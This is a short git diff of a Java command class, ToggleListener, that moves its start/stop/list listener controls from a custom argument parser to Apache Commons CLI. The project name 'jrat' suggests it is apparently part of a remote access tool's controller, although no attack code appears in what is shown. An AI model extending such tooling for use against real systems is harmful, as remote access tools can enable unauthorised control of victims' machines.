@@ -1,22 +1,23 @@
 package net.jrat.core.command.commands;
 
+import org.apache.commons.cli.CommandLine;
+
 import net.jrat.core.command.Command;
 import net.jrat.core.listener.Listener;
 import net.jrat.core.listener.State;
-import net.jrat.utils.Formatter;
 import net.jrat.utils.Logger;
 
 public class ToggleListener extends Command
 {
 	public ToggleListener()
 	{
-		super("tggllistener", new String[] { "-name", "-action" }, new String[] { "sets the name of the listener", "sets the action (start/stop/list)" }, "toggles a listeners state");
+		super("tggllistener", new String[] { "name", "action" }, new String[] { "sets the name of the listener", "sets the action (start/stop/list)" }, "toggles a listeners state");
 	}
 
 	@Override
-	public void execute(String[] arguments) throws Exception
+	public void execute(CommandLine commandLine) throws Exception
 	{
-		final String action = Formatter.getValue(arguments, "-action=").defaultTo(null);
+		final String action = commandLine.getOptionValue("action", null);
 		
 		if(action == null)
 			throw new Exception("action is needed");
@@ -45,7 +46,7 @@ public class ToggleListener extends Command
 			return;
 		}
 		
-		final String name = Formatter.getValue(arguments, "-name=").defaultTo(null);
+		final String name = commandLine.getOptionValue("name", null);
 		
 		if(name == null)
 			throw new Exception("name is needed");
